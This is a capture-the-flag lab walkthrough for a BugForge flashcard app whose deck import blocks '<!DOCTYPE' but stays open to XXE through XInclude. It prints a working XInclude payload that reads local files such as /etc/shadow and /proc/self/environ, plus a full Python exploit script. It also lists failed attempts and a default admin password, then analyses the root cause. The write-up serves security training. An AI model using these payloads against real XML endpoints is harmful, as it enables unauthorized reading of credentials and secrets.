# tanuki-003 - BugForge Lab Walkthrough

**URL:** https://lab-1783598578941-j86tye.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** XXE via XInclude injection (DOCTYPE-less XXE)
**Flag:** `bug{IAMhOP6D2yPESHbex7mgMSMR4wm7ghB7}`

---

## Summary

Tanuki is a React/Express spaced-repetition flashcard app with a deck import feature (`POST /api/decks/import`, multipart file upload, `.json`/`.xml`). The endpoint blocks any file containing the literal string `<!DOCTYPE`, closing off classic internal/external/parameter-entity XXE. However, XInclude (`http://www.w3.org/2001/XInclude`) requires no DOCTYPE declaration at all, so it bypasses the filter completely. Once XInclude fires, arbitrary local file read is possible; the flag was stored in plaintext at `/app/flag.txt`.

## Tech Stack

- Frontend: React SPA (CRA)
- Backend: Express.js, SQLite
- Auth: JWT
- Custom/regex-based "XML parser" (not a strict DOM parser - malformed XML degrades gracefully to empty fields rather than a hard error; namespace prefix changes on `xi:include` break resolution, indicating literal string matching rather than real libxml2 namespace-aware XInclude processing)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | Returns token directly, usable immediately |
| `POST /api/decks/import` | Bearer | multipart field `file`, accepts `.xml`/`.json`, this is the XXE sink |
| `GET /api/decks/:id` | Bearer | Returns name/description/category (no cards) |
| `GET /api/study/:id/cards?limit=10` | Bearer | Returns card front/back content |

## Attack Chain

### Step 1 - Register and get a token

```
POST /api/register {"username","email","password"}
-> bearer token
```

### Step 2 - Confirm baseline import works

Plain XML with no DOCTYPE imports fine, confirming the `.xml` content type is accepted by the import endpoint.

### Step 3 - Classic entity-based XXE is blocked

Any file containing the literal substring `<!DOCTYPE` (even an empty declaration with no `<!ENTITY>` at all) is rejected with `{"error":"Invalid file format or content"}`.

### Step 4 - Pivot to XInclude, which needs no DOCTYPE

```xml
<?xml version="1.0"?>
<deck xmlns:xi="http://www.w3.org/2001/XInclude">
  <name>Test</name>
  <description><xi:include href="/etc/hostname" parse="text"/></description>
  <category>test</category>
  <cards><card><front>Q</front><back>A</back></card></cards>
</deck>
```

Uploaded via multipart (`file=@payload.xml;type=text/xml`), this is accepted with no filter block.

### Step 5 - Confirm the read works, then locate the flag

Reads of common decoy paths (`/etc/passwd`, `/etc/hostname`, `/etc/shadow`, `/proc/self/environ`, `/app/package.json`, etc.) all returned the literal string `"Flag is somewhere else"`. This is not a redaction - it is the app's confirmation string meaning "XInclude fired and the file exists and was read, but this isn't the flag." Non-existent files or unresolved tags instead return `"[object Object]"`.

Swept a wordlist of plausible flag paths through the same XInclude harness, reading the `description` field of each imported deck via `GET /api/decks/:id`:

```python
for p in candidate_paths:
    xml = f'<deck xmlns:xi="..."><description><xi:include href="{p}" parse="text"/></description>...</deck>'
    # upload, then GET /api/decks/:id, check description field
```

`/app/flag.txt` returned the real flag directly in the `description` field.

## Exploit

```python
import urllib.request

TARGET = "https://lab-1783598578941-j86tye.labs-app.bugforge.io"

def register():
    import json
    req = urllib.request.Request(
        TARGET + "/api/register",
        data=json.dumps({"username": "pentest", "email": "pentest@example.com", "password": "Passw0rd!123"}).encode(),
        headers={"Content-Type": "application/json"},
    )
    return json.loads(urllib.request.urlopen(req).read())["token"]

def import_deck(token, path):
    xml = f'''<?xml version="1.0"?>
<deck xmlns:xi="http://www.w3.org/2001/XInclude">
  <name>Test</name>
  <description><xi:include href="{path}" parse="text"/></description>
  <category>test</category>
  <cards><card><front>Q</front><back>A</back></card></cards>
</deck>'''
    boundary = "----boundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="payload.xml"\r\n'
        f"Content-Type: text/xml\r\n\r\n{xml}\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    req = urllib.request.Request(
        TARGET + "/api/decks/import",
        data=body,
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
    )
    import json
    return json.loads(urllib.request.urlopen(req).read())

def get_deck(token, deck_id):
    import json
    req = urllib.request.Request(
        TARGET + f"/api/decks/{deck_id}",
        headers={"Authorization": f"Bearer {token}"},
    )
    return json.loads(urllib.request.urlopen(req).read())

token = register()
deck = import_deck(token, "/app/flag.txt")
result = get_deck(token, deck["id"])
print(result["description"])
# bug{IAMhOP6D2yPESHbex7mgMSMR4wm7ghB7}
```

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Internal DTD `<!ENTITY x SYSTEM "file://...">` | `<!DOCTYPE` substring filter rejects the whole upload | Classic XXE payload wordlists are useless once DOCTYPE itself is blocklisted, need a DOCTYPE-free vector |
| External DTD reference, blind OOB parameter-entity chain | Same DOCTYPE filter | Parameter entities can't help if you can never declare a DTD in the first place |
| UTF-16 encoding of the whole payload (to hide `<!DOCTYPE` from a naive UTF-8 substring check) | Bypassed the filter but the parser also never receives valid content - upload pipeline reads/decodes as UTF-8 regardless of declared XML encoding, corrupting the payload before both filter and parser | Encoding bypass only works if filter and parser diverge in how they decode bytes; here they use the same (broken) decode step |
| Changing `xi:` namespace prefix to `inc:` (same NS URI) | Resolution broke entirely (`[object Object]`) instead of bypassing detection | The app's "XInclude support" is a literal-string/regex match on `xi:include`, not real namespace-aware processing |
| Non-self-closing `<xi:include>...</xi:include>` form | Also unresolved | Regex likely requires the self-closing `/>` form specifically |
| SSRF via `http://`/`https://` XInclude hrefs, verified with OOB collaborator | Zero requests ever fired | This app's XInclude only supports local file resolution, not remote fetch |
| Default admin creds `admin/admin123` | Valid login, but not required for this specific challenge | Still worth trying early as a fast side-channel check |

## Root Cause

Deck import accepts arbitrary XML and only guards against the single literal string `<!DOCTYPE`, leaving XInclude (an equally powerful XXE-class primitive) completely unguarded:

```javascript
// Vulnerable pattern (approximate)
if (fileContent.includes('<!DOCTYPE')) {
  return res.status(400).json({ error: 'Invalid file format or content' });
}
// XML is then parsed with XInclude resolution enabled, no href allowlist
```

No sandboxing or allowlisting exists on `xi:include href`, so any local filesystem path is readable by the Node process's file-read permissions. The flag itself was also stored in plaintext on disk inside the web root's reachable filesystem rather than in a properly access-controlled store.

## CWE / OWASP

- **CWE-611**: Improper Restriction of XML External Entity Reference (via XInclude as an under-covered XXE sub-vector when defenses target only classic DOCTYPE/ENTITY syntax)
- **OWASP A05:2021** - Security Misconfiguration
